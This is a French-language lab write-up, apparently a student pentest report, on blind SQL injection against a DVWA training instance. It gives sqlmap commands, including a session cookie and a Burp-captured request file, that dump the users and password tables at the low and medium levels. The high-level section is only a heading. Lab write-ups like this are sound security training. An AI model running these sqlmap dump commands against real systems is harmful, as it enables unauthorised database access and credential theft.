# 1.SQL - blind

## 1.1 Premier niveau - low

Nous allons utiliser SQLMAP pour trouver les bases de données et les afficher   
Le principe est le meme que pour les autres injections.  
Nous allons utiliser la commande ci-dessous :  

```
sqlmap -u "http://34.163.97.167/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=bnk7pa0fohd54o1l6orc5624ko; security=low" --banner --current-user --current-db --is-dba --tables --columns --dump --fresh-queries
```

![images](C:\Users\Sacha\Desktop\pentest_dvwa\rapport_dvwa\images\sql\9.png)
On obtient ce resultat, `sqlmap` a donc bien trouve la DB.  

Maintenant, nous allons rajouter le parametre `-T` et `-D` pour afficher la base de données des utlisateur et leurs mots de passe. Pour gagner du temps nous ne dechiffreront pas les mots de passe car la base de données est la meme qu'avant et nous l'avont deja fait

```
sqlmap -u "http://34.163.97.167/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=bnk7pa0fohd54o1l6orc5624ko; security=low" --banner --current-user --current-db --is-dba --tables --columns --dump -T users -D dvwa
```

![images](C:\Users\Sacha\Desktop\pentest_dvwa\rapport_dvwa\images\sql\10.png)

## 1.2 Deuxieme niveau - medium

En utilisant Burp suite, nous allons capturer la requete `POST` 

![images](C:\Users\sacha\Desktop\pentest_dvwa\rapport_dvwa\images\sql\11.png)

On utilise encore la meme commande que precedemment 

```
sqlmap -r post.txt -p id
```

On voit dans la requete que le parametre a injecter est `id` on precise donc `-p id` et on met notre requete dans le fichier `post.txt`.

sqlmap identifie 2 types de vulnerabilites :

`boolen-based blind`

`time-based blind`

![images](C:\Users\sacha\Desktop\pentest_dvwa\rapport_dvwa\images\sql\12.png)

On reutilise donc les meme parametres apres avoir identifier le nom de la bases de donnes et les tables :

```
sqlmap -r post.txt -p id --dump -T users -D dvwa
```

## 1.3 Troisieme niveau - high
